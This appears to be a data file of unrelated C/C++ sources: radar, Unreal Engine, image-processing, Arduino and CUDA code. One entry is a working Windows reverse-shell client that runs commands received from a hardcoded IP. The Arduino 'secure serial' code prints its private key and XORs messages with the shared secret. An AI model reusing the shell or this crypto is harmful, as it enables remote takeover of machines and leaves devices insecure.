std::endl;\n        return EXIT_FAILURE;\n    }\n\n\n/*\n    USRPHandler<std::complex<float>> victim(radar_config);\n    USRPHandler<std::complex<float>> attack(attack_config);\n */   \n \n/* \n    usrp_handler.load_BufferHandler( & buffer_handler);\n    \n    //stream the frame\n    std::cout << \"\\nMAIN: Streaming Frames\\n\";\n    usrp_handler.stream_frames();\n\n    //EXTRA CODE FOR DEBUGGING PURPOSES\n\n    //std::cout << \"Rx Buffer Preview\" <<std::endl;\n    //buffer_handler.print_2d_buffer_preview(buffer_handler.rx_buffer);\n\n    //buffer_handler.rx_buffer = buffer_handler.tx_buffer;\n    //buffer_handler.save_rx_buffer_to_file();\n*/\n    return EXIT_SUCCESS;\n}\n",
    "// Copyright INVI1998\n\n\n#include \"AbilitySystem/AbilityTasks/TargetDataUnderMouse.h\"\n\n#include \"AbilitySystemComponent.h\"\n#include \"Kismet/KismetSystemLibrary.h\"\n#include \"Player/AuraPlayerController.h\"\n\nUTargetDataUnderMouse* UTargetDataUnderMouse::CreateTargetDataUnderMouse(UGameplayAbility* OwningAbility)\n{\n\t// \u521b\u5efa\u4e00\u4e2aUTargetDataUnderMouse*\u7c7b\u578b\u7684\u6307\u9488\n\tUTargetDataUnderMouse* MyObj = NewAbilityTask<UTargetDataUnderMouse>(OwningAbility);\n\n\t// \u8fd4\u56de\u8fd9\u4e2a\u6307\u9488\n\treturn MyObj;\n}\n\nvoid UTargetDataUnderMouse::Activate()\n{\n\tconst bool bIsLocallyControlled = Ability->GetCurrentActorInfo()->IsLocallyControlled();\n\tif (bIsLocallyControlled)\n\t{\n\t\tSendMouseTargetData();\n\t}\n\telse\n\t{\n\t\t// TODO: \u5728\u670d\u52a1\u7aef\uff0c\u76d1\u542c\u5ba2\u6237\u7aef\u7684MouseTargetData\n\n\t\tconst FGameplayAbilitySpecHandle AbilitySpecHandle = GetAbilitySpecHandle();\t// \u83b7\u53d6AbilitySpecHandle, \u7528\u4e8e\u6807\u8bc6Ability\n\t\tconst FPredictionKey ActivationPredictionKey = GetActivationPredictionKey();\t// \u83b7\u53d6ActivationPredictionKey, \u7528\u4e8e\u6807\u8bc6Ability\u7684\u6fc0\u6d3b\u9884\u6d4b\n\n\t\t// \u8fd9\u91cc\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528AbilitySystemComponent.Get()->AbilityTargetDataSetDelegate()\u6765\u76d1\u542c\u5ba2\u6237\u7aef\u7684MouseTargetData\n\t\tAbilitySystemComponent.Get()->AbilityTargetDataSetDelegate(AbilitySpecHandle, ActivationPredictionKey).AddUObject(this, &UTargetDataUnderMouse::OnTargetDataReplicatedCallback);\t// \u6dfb\u52a0\u4e00\u4e2a\u59d4\u6258\uff0c\u5f53\u5ba2\u6237\u7aef\u5e7f\u64adMouseTargetData\u65f6\uff0c\u5c31\u4f1a\u8c03\u7528OnTargetDataReplicatedCallback\u51fd\u6570\n\n\t\t// \u4e00\u65e6\u670d\u52a1\u5668\u4e0a\u8c03\u7528\u4e86\u6fc0\u6d3b\uff0c\u670d\u52a1\u5668\u5c31\u53ef\u4ee5\u5c06\u5176\u56de\u8c03\u7ed1\u5b9a\u5230\u8fd9\u4e2a\u59d4\u6258\u4e0a\uff0c\u8fd9\u6837\u5f53\u5ba2\u6237\u7aef\u5e7f\u64adMouseTargetData\u65f6\uff0c\u5c31\u4f1a\u8c03\u7528OnTargetDataReplicatedCallback\u51fd\u6570\n\n\t\t// \u4f46\u662f\u5982\u679c\u6211\u4eec\u5df2\u7ecf\u6765\u4e0d\u53ca\uff0c\u76ee\u6807\u6570\u636e\u5df2\u7ecf\u88ab\u5e7f\u64ad\u4e86\uff0c\u90a3\u4e48\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u6211\u4eec\u4f9d\u7136\u5e94\u8be5\u8c03\u7528\u8be5\u56de\u8c03\n\t\t// \u6240\u4ee5\uff0c\u6709\u4e00\u79cd\u65b9\u6cd5\u53ef\u4ee5\u68c0\u67e5\u6216\u8005\u81f3\u5c11\u53ef\u4ee5\u5728\u5df2\u7ecf\u63a5\u6536\u5230\u76ee\u6807\u6570\u636e\u65f6\u8c03\u7528\u8be5\u76ee\u6807\u7684\u6570\u636e\u59d4\u6258\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7CallReplicatedTargetDataDelegatesIfSet\u6765\u68c0\u67e5\u662f\u5426\u5df2\u7ecf\u63a5\u6536\u5230\u76ee\u6807\u6570\u636e\uff0c\u5982\u679c\u6211\u4eec\u6ca1\u6709\u8c03\u7528\u8fd9\u4e2a\u59d4\u6258\uff0c\u90a3\u5c31\u610f\u5473\u7740\u5b83\u8fd8\u6ca1\u6709\u5230\u8fbe\u670d\u52a1\u5668\uff0c\u6240\u4ee5\u6211\u4eec\u9700\u8981\u7ee7\u7eed\u7b49\u5f85\n\t\tconst bool bCalledDelegate = AbilitySystemComponent.Get()->CallReplicatedTargetDataDelegatesIfSet(AbilitySpecHandle, ActivationPredictionKey);\t\t// \u5982\u679c\u5df2\u7ecf\u63a5\u6536\u5230\u76ee\u6807\u6570\u636e\uff0c\u90a3\u4e48\u5c31\u8c03\u7528\u8be5\u76ee\u6807\u7684\u6570\u636e\u59d4\u6258\n\t\tif (!bCalledDelegate)\n\t\t{\n\t\t\t// \u5982\u679c\u6ca1\u6709\u63a5\u6536\u5230\u76ee\u6807\u6570\u636e\uff0c\u90a3\u4e48\u5c31\u7ee7\u7eed\u7b49\u5f85\n\t\t\tSetWaitingOnRemotePlayerData();\n\t\t}\n\t}\n\n}\n\nvoid UTargetDataUnderMouse::SendMouseTargetData()\n{\n\t// \u521b\u5efa\u4e00\u4e2aFScopedPredictionWindow\u5bf9\u8c61\uff0c\u7528\u4e8e\u7ba1\u7406\u9884\u6d4b\u7a97\u53e3\uff0c\u8fd9\u4e2a\u5bf9\u8c61\u4f1a\u5728\u4f5c\u7528\u57df\u7ed3\u675f\u65f6\u81ea\u52a8\u9500\u6bc1\uff0c\u4ed6\u9700\u8981\u4f20\u9012\u4e00\u4e2aAbilitySystemComponent\u6307\u9488\uff0c\u4ee5\u53ca\u4e00\u4e2a\u662f\u5426\u4f7f\u7528\u9884\u6d4b\u7684\u5e03\u5c14\u503c\uff0c\u8fd9\u91cc\u6211\u4eec\u4f7f\u7528\u9884\u6d4b\uff0c\u6240\u4ee5\u4f20\u9012true\uff08\u9ed8\u8ba4\u503c\uff09\n\tFScopedPredictionWindow ScopedPrediction(AbilitySystemComponent.Get());\n\n\t// \u5f53\u524d\u4f5c\u7528\u57df\u5185\u7684\u4ee3\u7801\u5c06\u4f7f\u7528\u9884\u6d4b\uff0c\u8fd9\u610f\u5473\u7740\u6211\u4eec\u53ef\u4ee5\u5728\u5ba2\u6237\u7aef\u4e0a\u6267\u884c\u8fd9\u4e9b\u4ee3\u7801\uff0c\u800c\u4e0d\u4f1a\u7b49\u5f85\u670d\u52a1\u5668\u7684\u54cd\u5e94\uff0c\n\t// \u5f53\u670d\u52a1\u7aef\u5f97\u77e5\u8fd9\u4e2a\u9884\u6d4b\u65f6\uff0c\u5b83\u4f1a\u5728\u670d\u52a1\u7aef\u4e0a\u6267\u884c\u76f8\u540c\u7684\u4ee3\u7801\uff0c\u7136\u540e\u6bd4\u8f83\u7ed3\u679c\uff0c\u5982\u679c\u7ed3\u679c\u4e0d\u540c\uff0c\u90a3\u4e48\u670d\u52a1\u7aef\u4f1a\u7ea0\u6b63\u5ba2\u6237\u7aef\u7684\u9884\u6d4b\uff0c\u8fd9\u6837\u5c31\u4fdd\u8bc1\u4e86\u5ba2\u6237\u7aef\u548c\u670d\u52a1\u7aef\u7684\u4e00\u81f4\u6027\n\n\t// \u8fd9\u4e2a\u7c7b\u7ee7\u627f\u81ea FGameplayAbilityTargetData\uff0c\u5b83\u662f\u7528\u4e8e\u63cf\u8ff0 Ability \u7cfb\u7edf\u4e2d\u76ee\u6807\u9009\u62e9\u548c\u5b9a\u4f4d\u4fe1\u606f\u7684\u57fa\u672c\u7ed3\u6784\n\tFGameplayAbilityTargetData_SingleTargetHit* Data = new FGameplayAbilityTargetData_SingleTargetHit();\t// \u521b\u5efa\u4e00\u4e2a\u65b0\u7684FGameplayAbilityTargetData_SingleTargetHit\u5bf9\u8c61\n\n\tFGameplayAbilityTargetDataHandle DataHandle;\t// \u521b\u5efa\u4e00\u4e2aFGameplayAbilityTargetDataHandle\u5bf9\u8c61\n\n\tAAuraPlayerController* PC = Cast<AAuraPlayerController>(Ability->GetCurrentActorInfo()->PlayerController.Get());\t// \u83b7\u53d6\u73a9\u5bb6\u63a7\u5236\u5668\n\tData->HitResult = PC->GetCursorHitResult();\t// \u83b7\u53d6\u73a9\u5bb6\u63a7\u5236\u5668\u7684\u5149\u6807\u547d\u4e2d\u7ed3\u679c\n\tDataHandle.Add(Data);\t// \u5c06Data\u6dfb\u52a0\u5230DataHandle\u4e2d\n\n\tFGameplayTag ApplicationTag;\n\n\t// \u5ba2\u6237\u7aef\u8c03\u7528ServerSetReplicatedTargetData\uff0c\u5c06DataHandle\u4f20\u9012\u7ed9\u670d\u52a1\u7aef\n\tAbilitySystemComponent->ServerSetReplicatedTargetData(\n\t\tGetAbilitySpecHandle(),\t\t// \u83b7\u53d6AbilitySpecHandle, \u7528\u4e8e\u6807\u8bc6Ability\n\t\tGetActivationPredictionKey(),\t// \u83b7\u53d6ActivationPredictionKey, \u7528\u4e8e\u6807\u8bc6Ability\u7684\u6fc0\u6d3b\u9884\u6d4b\n\t\tDataHandle,\t\t// \u4f20\u9012DataHandle, \u7528\u4e8e\u4f20\u9012\u76ee\u6807\u6570\u636e\uff0c\u8fd9\u91cc\u662f\u5149\u6807\u547d\u4e2d\u7ed3\u679c\uff08\u6240\u4ee5\u4e0a\u9762\u7684DataHandle.Add(Data);\n\t\tApplicationTag,\t\t// \u4f20\u9012ApplicationTag, \u7528\u4e8e\u6807\u8bc6Ability\u7684\u5e94\u7528\u6807\u7b7e\n\t\tAbilitySystemComponent->ScopedPredictionKey\t// \u4f20\u9012ScopedPredictionKey, \u7528\u4e8e\u6807\u8bc6Ability\u7684\u9884\u6d4b\u952e\uff0cScoped\u610f\u5473\u7740\u8fd9\u4e2a\u9884\u6d4b\u952e\u53ea\u5728\u8fd9\u4e2aAbility\u4e2d\u6709\u6548\uff0c\u5b83\u4ec5\u9650\u4e8e\u6211\u4eec\u521b\u5efa\u7684\u8fd9\u4e2aScopedPrediction\u5bf9\u8c61\u7684\u751f\u547d\u5468\u671f\n\t);\n\n\t// \u5e7f\u64ad\u80fd\u529b\u7cfb\u7edf\u7684\u76ee\u6807\u6570\u636e\n\t// \u4f46\u662f\u5e7f\u64ad\u4e4b\u524d\uff0c\u9700\u8981\u5148\u5224\u65ad\u662f\u5426\u6709\u5408\u6cd5\u7684\u76ee\u6807\u6570\u636e\uff0c\u6bd4\u5982\u5982\u679c\u80fd\u529b\u5df2\u7ecf\u4e0d\u518d\u6fc0\u6d3b\uff0c\u90a3\u4e48\u5c31\u4e0d\u9700\u8981\u5e7f\u64ad\u4e86\n\tif (ShouldBroadcastAbilityTaskDelegates())\n\t{\n\t\t// \u8fd9\u91ccBroadcast\u9700\u8981\u4f20\u9012\u4e00\u4e2aFVector\u7c7b\u578b\u7684\u53c2\u6570\uff0c\u4f46\u662f\u8fd9\u91cc\u6211\u60f3\u6539\u4e3a\u4f20\u9012DataHandle\uff0c\u6240\u4ee5\u6211\u5728UTargetDataUnderMouse.h\u4e2d\u6539\u53d8\u4e86ValidData\u7684\u7c7b\u578b\u4e3aFGameplayAbilityTargetDataHandle\n\t\t// \u8fd9\u6837\u6211\u4eec\u5c31\u80fd\u7ee7\u7eed\u901a\u8fc7\u5e7f\u64ad\u4f20\u9012\u6574\u4e2aDataHandle\uff0c\u53ef\u4ee5\u83b7\u53d6\u547d\u4e2d\u7ed3\u679c\u548c\u76ee\u6807\u6570\u636e\u4e2d\u5305\u542b\u7684\u4efb\u4f55\u5176\u4ed6\u5185\u5bb9\uff0c\u7136\u540e\u5728Ability\u4e2d\u901a\u8fc7\u59d4\u6258\u7684\u56de\u8c03\u51fd\u6570\u4e2d\u83b7\u53d6DataHandle\n\t\tValidData.Broadcast(DataHandle);\n\t}\n}\n\nvoid UTargetDataUnderMouse::OnTargetDataReplicatedCallback(const FGameplayAbilityTargetDataHandle& DataHandle,\n\tFGameplayTag ActivationTag)\n{\n\t// \u4e00\u65e6\u8fdb\u5165\u8fd9\u4e2a\u51fd\u6570\uff0c\u5c31\u610f\u5473\u7740\u6211\u4eec\u5df2\u7ecf\u63a5\u6536\u5230\u4e86 replicated \u76ee\u6807\u6570\u636e\uff0c\u800c\u4e14\u6211\u4eec\u77e5\u9053\uff0creplicated \u53ea\u4f1a\u4ece\u670d\u52a1\u7aef\u5230\u5ba2\u6237\u7aef\uff0c\n\t// \u4f46\u662f\u5728GAS\u4e2d\uff0c\u4f60\u4f1a\u53d1\u73b0\uff0c\u5ba2\u6237\u7aef\u4e5f\u53ef\u4ee5\u53d1\u9001 replicated \u76ee\u6807\u6570\u636e\uff0c\u8fd9\u91cc\u5c31\u662f\u4e00\u4e2a\u4f8b\u5b50\uff0c\u6211\u4eec\u5728\u5ba2\u6237\u7aef\u53d1\u9001\u4e86 replicated \u76ee\u6807\u6570\u636e\uff0c\u7136\u540e\u670d\u52a1\u7aef\u63a5\u6536\u5230\u4e86\u8fd9\u4e2a\u6570\u636e\n\t// \u6240\u4ee5\uff0c\u5f53\u63a5\u6536\u5230 replicated \u76ee\u6807\u6570\u636e\u65f6\uff0c\u6b64\u51fd\u6570\u5c06\u5728\u670d\u52a1\u7aef\u8c03\u7528\n\n\t// \u6240\u4ee5\uff0c\u6211\u4eec\u9700\u8981\u5728\u8fd9\u91cc\u5e7f\u64ad\u76ee\u6807\u6570\u636e\uff0c\u4f46\u662f\uff0c\u6211\u4eec\u540c\u65f6\u8fd8\u9700\u8981\u786e\u4fddASC\uff08AbilitySystemComponent\uff09\u5df2\u7ecf\u77e5\u9053\u8fd9\u4e2a\u6570\u636e\u88ab\u63a5\u6536\u5230\u4e86\n\t// \u56e0\u4e3a\u5f53\u670d\u52a1\u5668\u63a5\u6536\u5230Replicated\u76ee\u6807\u6570\u636e\u65f6\uff0c\u4ed6\u4f1a\u5c06\u6570\u636e\u5b58\u50a8\u5728ASC\u7684AbilityTargetDataMap\u4e2d\uff0c\n\t// \u6240\u4ee5\u8fd9\u4e2a\u65f6\u5019\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u544a\u8bc9ASC\u6211\u4eec\u5df2\u7ecf\u63a5\u6536\u5230\u4e86\u76ee\u6807\u6570\u636e\uff0c\u8c03\u7528ASC\u7684ConsumeClientReplicatedTargetData\u51fd\u6570\uff0c\u4f20\u9012AbilitySpecHandle\u548cActivationPredictionKey\n\t// \u8ba9ASC\u4e0d\u5fc5\u518d\u5b58\u50a8\u8fd9\u4e2a\u6570\u636e\n\tAbilitySystemComponent->ConsumeClientReplicatedTargetData(GetAbilitySpecHandle(), GetActivationPredictionKey());\t// \u544a\u8bc9ASC\u6211\u4eec\u5df2\u7ecf\u63a5\u6536\u5230\u4e86\u76ee\u6807\u6570\u636e\n\n\t// \u7136\u540e\u6211\u4eec\u5c31\u53ef\u4ee5\u5e7f\u64ad\u76ee\u6807\u6570\u636e\u4e86\n\t// \u4e00\u6837\u7684\uff0c\u5e7f\u64ad\u4e4b\u524d\uff0c\u8fd8\u5e94\u8be5\u5224\u65ad\u662f\u5426\u6709\u5408\u6cd5\u7684\u76ee\u6807\u6570\u636e\uff0c\u6bd4\u5982\u5982\u679c\u80fd\u529b\u5df2\u7ecf\u4e0d\u518d\u6fc0\u6d3b\uff0c\u90a3\u4e48\u5c31\u4e0d\u9700\u8981\u5e7f\u64ad\u4e86\n\tif (ShouldBroadcastAbilityTaskDelegates())\n\t{\n\t\tValidData.Broadcast(DataHandle);\n\t}\n\n}\n",
    "// Build using the command => g++ client.cpp -o client.exe -lws2_32 -static-libstdc++ -static-libgcc -static\n// Build using the command => g++ client.cpp -o client.exe -lws2_32 -static-libgcc\n// Linker attributes -lws2_32 -static-libstdc++ -static-libgcc -static\n\n#include <iostream>\n#include <winsock2.h>\n#include <ws2tcpip.h>\n#include <string.h>\n#include <unistd.h>\n\nusing namespace std;\n\n#define BUFFER_SIZE 2048\n#define PORT 55555\n#define IP_ADDR \"10.10.15.177\"\n\nstring exec(string command) {\n   char buffer[BUFFER_SIZE];\n   string result = \"\";\n\n   // Open pipe to file\n   FILE* pipe = popen(command.c_str(), \"r\");\n   if (!pipe) {\n      return \"popen failed!\";\n   }\n\n   // read till end of process:\n   while (!feof(pipe)) {\n\n      // use buffer to read and add to result\n      if (fgets(buffer, BUFFER_SIZE, pipe) != NULL)\n         result += buffer;\n   }\n\n   pclose(pipe);\n   return result;\n}\n\nint main(int argc, char const *argv[]){\n    SOCKET clientSocket;\n    WSADATA wsaData;\n    \n    if(WSAStartup(MAKEWORD(2,2),&wsaData) != 0){\n        cout<< \" Failed at WSAStartup !\" <<endl;\n        return -1;\n    }\n    cout<< \"[*] WSAStartup successful \"<<endl;\n\n    clientSocket = INVALID_SOCKET;\n    clientSocket = socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);\n\n    if(clientSocket == INVALID_SOCKET){\n        cout << \"Error at socket()\"<<endl;\n        WSACleanup();\n        return -1;\n    }\n    cout<< \"[*] Socket successful \"<<endl;\n\n    sockaddr_in service;\n    service.sin_family = AF_INET;\n    service.sin_addr.s_addr = inet_addr(IP_ADDR);\n    service.sin_port = htons(PORT);\n    memset(&(service.sin_zero),0,8);\n    \n    if(connect(clientSocket,(SOCKADDR *)&service,sizeof(service)) == SOCKET_ERROR){\n        cout << \"Error at connect()\"<<endl;\n        WSACleanup();\n        return -1;\n    }\n    cout<< \"[*] Connect successful \"<<endl;\n\n    int response;\n    \n    char receivedData[BUFFER_SIZE];\n    char sendData[BUFFER_SIZE];\n\n    strcpy(receivedData,\"\\0\");\n    getcwd(sendData,BUFFER_SIZE);\n\n    while (true)\n    {   \n        response = send(clientSocket,sendData,BUFFER_SIZE,0);\n        response = recv(clientSocket,receivedData,BUFFER_SIZE,0);\n        string command(receivedData);\n\n        if(strcmp(command.substr(0,2).c_str(),\"cd\") == 0){\n            if (command.size() == 2) getcwd(sendData,BUFFER_SIZE);\n            if (command.size() > 2){\n                chdir(command.substr(3).c_str());\n                getcwd(sendData,BUFFER_SIZE);\n            }\n            continue;\n        }\n        if(strcmp(command.c_str(),\"exit\") == 0){\n            return -1;\n        }\n        string result = exec(command);\n        strcpy(sendData,result.c_str());\n    }\n    \n    WSACleanup();\n    return 0;\n}\n",
    "//\n// Created by MasaHiroSaber on 2023/11/29.\n//\n\n#include \"CImageProcessingEx.h\"\n#include \"CalFunction.h\"\n#include \"PCAMatrix.h\"\n\nusing namespace std;\ndouble separability;\n\nCImageProcessingEx::CImageProcessingEx(void)\n{}\n\nCImageProcessingEx::~CImageProcessingEx(void)\n{}\n\n//\u76f4\u65b9\u56fe\u5747\u8861\u5316\nBOOL CImageProcessingEx::hisTeg(CImageDataset &imgIn, CImageDataset &imgOut)\n{\n    const int LEVEL = 256;\n    int k, row, col;\n    double hist[LEVEL], sk[LEVEL];\n\n    if (imgIn.empty())\n    {\n        return FALSE;\n    }\n\n    if (FALSE == imgIn.duplicate(imgOut))\n    {\n        return FALSE;\n    }\n    double *data = imgOut.m_data;\n\n    for (k = 0; k < LEVEL; k++)\n    {\n        hist[k] = 0;\n    }\n    for (row = 0; row < imgIn.m_ysize; row++)\n    {\n        for (col = 0; col < imgIn.m_xsize; col++)\n        {\n            hist[UINT8(data[row * imgIn.m_xsize + col])]++;\n        }\n    }\n\n    sk[0] = hist[0] / (imgIn.m_ysize * imgIn.m_xsize);\n    for (k = 1; k < LEVEL - 1; k++)\n    {\n        sk[k] = sk[k - 1] + hist[k] / (imgIn.m_ysize * imgIn.m_xsize);\n    }\n    sk[255] = 1;\n\n    for (row = 0; row < imgOut.m_ysize; row++)\n    {\n        for (col = 0; col < imgOut.m_xsize; col++)\n        {\n            for (k = 0; k < LEVEL; k++)\n            {\n                if (data[row * imgOut.m_xsize + col] == k)\n                {\n                    data[row * imgOut.m_xsize + col] = int((LEVEL - 1) * sk[k] + 0.5);//\u7070\u5ea6\u53d8\u6362\n                    k = LEVEL;\n                }\n            }\n        }\n    }\n    return TRUE;\n}\n\n//\u76f4\u65b9\u56fe\u5339\u914d\nBOOL CImageProcessingEx::hisMatch(CImageDataset &imgIn, CImageDataset &imgReference, CImageDataset &imgOut)\n{\n    if (imgIn.empty() || imgReference.empty()) return FALSE;\n\n    const int LEVEL = 256;\n    vector<double> imgInHist(LEVEL), imgRefHist(LEVEL);\n    vector<double> imgInCumHist(LEVEL), imgRefCumHist(LEVEL);\n\n    if (FALSE == imgOut.create(imgIn.m_xsize, imgIn.m_ysize, imgIn.m_rastercount))\n        return FALSE;\n\n    double *imgOutput = imgOut.m_data;\n    const double *imgInput = imgIn.m_data;\n\n    int area = imgIn.m_xsize * imgIn.m_ysize;\n\n    for (int band = 0; band < imgIn.m_rastercount; band++)\n    {\n        CalFunction::calHist(imgIn, band, imgInHist);\n        CalFunction::calHist(imgReference, band, imgRefHist);\n\n        CalFunction::calCumHist(imgInHist, imgInCumHist, area, LEVEL);\n        CalFunction::calCumHist(imgRefHist, imgRefCumHist, area, LEVEL);\n\n        vector<double> temp(LEVEL);\n        vector<double>::iterator minValue;\n        int record[LEVEL];\n\n        int i, j;\n        for (i = 0; i < LEVEL; i++)\n        {\n            for (j = 0; j < LEVEL; j++)\n            {\n                temp[j] = abs(imgInCumHist[i] - imgRefCumHist[j]);\n            }\n            //#include <algorithm> \u6765\u4f7f\u7528 min_element\n            minValue = min_element(temp.begin(), temp.end());\n            record[i] = distance(temp.begin(), minValue);\n        }\n\n\n        for (int row = 0; row < imgIn.m_ysize; row++)\n        {\n            for (int col = 0; col < imgIn.m_xsize; col++)\n            {\n                int index = band * imgIn.m_ysize * imgIn.m_xsize + row * imgIn.m_xsize + col;\n                imgOutput[index] = record[int(imgInput[index])];\n            }\n        }\n    }\n    return TRUE;\n}\n\n\nBOOL CImageProcessingEx::medFilter(CImageDataset &imgIn, CImageDataset &imgOut, int kerLen)\n{\n    if (imgIn.empty()) return FALSE;\n\n    if (FALSE == imgOut.create(imgIn.m_xsize, imgIn.m_ysize, imgIn.m_rastercount))\n        return FALSE;\n\n    int count = 0;\n    int kerArea = kerLen * kerLen;\n    int border = kerLen / 2;\n\n    double *imgOutput = imgOut.m_data;\n    const double *imgInput = imgIn.m_data;\n\n    CImageDataset Temp;\n    CalFunction::zeroFill(imgIn, Temp, kerLen);\n//    Temp.create(imgIn.m_xsize + 2 * border, imgIn.m_ysize + 2 * border, imgIn.m_rastercount);\n    vector<double> kerValue(kerArea);\n\n    //0\u586b\u5145\n    for (int band = 0; band < imgIn.m_rastercount; band++)\n    {\n        for (int row = border; row < Temp.m_ysize - border; row++)\n        {\n            for (int col = border; col < Temp.m_xsize - border; col++)\n            {\n                int indexTemp = band * Temp.m_ysize * Temp.m_xsize + row * Temp.m_xsize + col;\n                int indexIn = band * imgIn.m_ysize * imgIn.m_xsize + (row - border) * imgIn.m_xsize + (col - border);\n\n                Temp.m_data[indexTemp] = imgInput[indexIn];\n            }\n        }\n    }\n\n    for (int band = 0; band < Temp.m_rastercount; band++)\n    {\n        for (int row = border; row < Temp.m_ysize - border; row++)\n        {\n            for (int col = border; col < Temp.m_xsize - border; col++)\n            {\n                for (int kerRow = row - border; kerRow <= row + border; kerRow++)\n                {\n                    for (int kerCol = col - border; kerCol <= col + border; kerCol++)\n                    {\n                        int index = band * Temp.m_ysize * Temp.m_xsize + kerRow * Temp.m_xsize + kerCol;\n                        kerValue[count++] = Temp.m_data[index];\n                    }\n",
    "#include \"uECC.h\"\r\n#include \"secure_serial.h\"\r\n\r\nstatic int random_uECC(uint8_t *dest, unsigned size) {\r\n  while (size) {\r\n    uint8_t val = 0;\r\n    for (unsigned i = 0; i < 8; ++i) {\r\n        int init = analogRead(0);\r\n        int count = 0;\r\n        while (analogRead(0) == init) ++count;\r\n        if (!count) val = (val << 1) | (init & 0x01);\r\n        else val = (val << 1) | (count & 0x01);\r\n    }\r\n\r\n    *dest = val;\r\n    ++dest;\r\n    --size;\r\n  }\r\n\r\n  return 1;\r\n}\r\n\r\nvoid print_array(uint8_t* arr, int len) {\r\n    for (int i=0; i<len; ++i) {\r\n        Serial.print(arr[i]);\r\n        Serial.print(\",\");\r\n    }\r\n    Serial.println();\r\n}\r\n\r\nvoid secure_serial::begin(uint8_t rx, uint8_t tx, bool first_device) {\r\n    LOG_START\r\n    serial = new SoftwareSerial(rx, tx);\r\n    curve = uECC_secp256r1();\r\n    first = first_device;\r\n\r\n    pinMode(rx, INPUT);\r\n    pinMode(tx, OUTPUT);\r\n\r\n    serial->begin(115200);\r\n    while (!(*serial));\r\n\r\n    uECC_set_rng(&random_uECC);\r\n    uECC_make_key(public_key, private_key, curve);\r\n\r\n    print_array(public_key, key_size * 2);\r\n    print_array(private_key, key_size);\r\n    LOG_END\r\n}\r\n\r\nvoid secure_serial::recv_to_serial() {\r\n    LOG_START\r\n\r\n    while (serial->available()) {\r\n        Serial.write((char) serial->read());\r\n    }\r\n    LOG_END\r\n}\r\n\r\nvoid secure_serial::send(const char* msg) {\r\n    LOG_START\r\n    serial->print(msg);\r\n    LOG_END\r\n}\r\n\r\nvoid secure_serial::recv_line(char* dst, int maxlen) {\r\n    int l=0;\r\n    char ch = '\\0';\r\n    while (ch != '\\n' && l < maxlen) {\r\n        ch = serial->read();\r\n        dst[l++] = ch;\r\n    }\r\n}\r\n\r\nvoid secure_serial::send_from_serial() {\r\n    LOG_START\r\n    while (Serial.available())\r\n        serial->print((char) Serial.read());\r\n    recv_to_serial();\r\n    LOG_END\r\n}\r\n\r\nint secure_serial::available() {\r\n    return serial->available();\r\n}\r\n\r\nvoid secure_serial::recv_pub_key() {\r\n    LOG_START\r\n    send(CMDRECP);\r\n    WAIT(CMDRECA);\r\n\r\n    uint8_t recv_pub_key[key_size * 2];\r\n    uint8_t sz = serial->readBytes(recv_pub_key, key_size * 2);\r\n#ifdef DEBUG\r\n    Serial.print(\"[DEBUG] recv:\");\r\n    Serial.println(sz);\r\n#endif\r\n    uECC_shared_secret(recv_pub_key, private_key, shared_secret, curve);\r\n    LOG_END\r\n}\r\n\r\nvoid secure_serial::send_hello() {\r\n    LOG_START\r\n    send(CMDHELLO1);\r\n    LOG_END\r\n}\r\n\r\nvoid secure_serial::send_hello2() {\r\n    LOG_START\r\n    send(CMDHELLO2);\r\n    LOG_END\r\n}\r\n\r\nvoid secure_serial::send_pub_key() {\r\n    LOG_START\r\n    send(CMDRECA);\r\n    for (uint8_t i=0; i<key_size; ++i)\r\n        serial->write(public_key[i]);\r\n    if (!first) send(CMDRECP);\r\n    LOG_END\r\n}\r\n\r\nvoid secure_serial::initial_sequence() {\r\n    LOG_START\r\n    if (first) {\r\n        send_hello();\r\n        recv_pub_key();\r\n        WAIT(CMDRECP);\r\n        send_pub_key();\r\n    } else {\r\n        WAIT(CMDHELLO1);\r\n        send_hello2();\r\n        WAIT(CMDRECP);\r\n        send_pub_key();\r\n        recv_pub_key();\r\n    }\r\n\r\n    LOG_END\r\n}\r\n\r\nvoid secure_serial::send_msg(uint8_t* message, int len) {\r\n    LOG_START\r\n    send(CMDMSG);\r\n    serial->print(len);\r\n    for (int i = 0; i < len; i++) {\r\n        serial->print((char)(message[i] ^ shared_secret[i%key_size]));\r\n    }\r\n    LOG_END\r\n}\r\n\r\nvoid secure_serial::recv_msg(uint8_t* message, int len) {\r\n    LOG_START\r\n    WAIT(CMDMSG);\r\n    int r = serial->read();\r\n    serial->readBytes(message, r);\r\n\r\n    for (int i=0; i<r; ++i) {\r\n        message[i] ^= shared_secret[i % key_size];\r\n    }\r\n    LOG_END\r\n}\r\n\r\nvoid secure_serial::set_public_key(const char *key) {\r\n    memcpy(public_key, key, key_size * 2);\r\n}\r\n\r\nvoid secure_serial::set_private_key(const char *key) {\r\n    memcpy(private_key, key, key_size * 2);\r\n}\r\n\r\nvoid secure_serial::set_shared_secret(const char *secret) {\r\n    memcpy(shared_secret, secret, key_size);\r\n}",
    "#include <GPU_BFS.cuh>\n#include <Union-Find.cuh>\n#include <Workfront-Sweep.cuh>\n#include <GPU_PageRank.cuh>\n// #include <GPU_Community_Detection.cuh>\n\n#include <CPU_BFS.hpp>\n#include <CPU_connected_components.hpp>\n#include <CPU_shortest_paths.hpp>\n#include <CPU_PageRank.hpp>\n#include <CPU_Community_Detection.hpp>\n\n#include <checker.hpp>\n\n#include <time.h>\n\nint main()\n{\n    std::string config_file;\n    std::cout << \"Enter the name of the configuration file:\" << std::endl;\n    std::cin >> config_file;\n    config_file = \"../data/\" + config_file;\n\n    graph_structure<double> graph;\n    graph.read_config(config_file);\n\n    graph.load_LDBC();\n    CSR_graph<double> csr_graph = graph.toCSR();\n    std::cout << \"Number of vertices: \" << csr_graph.OUTs_Neighbor_start_pointers.size() << std::endl;\n    std::cout << \"Number of edges: \" << csr_graph.OUTs_Edges.size() << std::endl;\n\n    float elapsedTime = 0;\n\n    clock_t start = clock(), end = clock();\n\n    if (graph.sup_bfs) {\n        std::vector<int> cpu_bfs_result;\n        start = clock();\n        cpu_bfs_result = CPU_BFS<double>(graph.OUTs, graph.bfs_src);\n        end = clock();\n        printf(\"CPU BFS cost time: %f ms\\n\", (double)(end - start) / CLOCKS_PER_SEC * 1000);\n\n        std::vector<int> gpu_bfs_result;\n        gpu_bfs_result = cuda_bfs(csr_graph, graph.bfs_src, 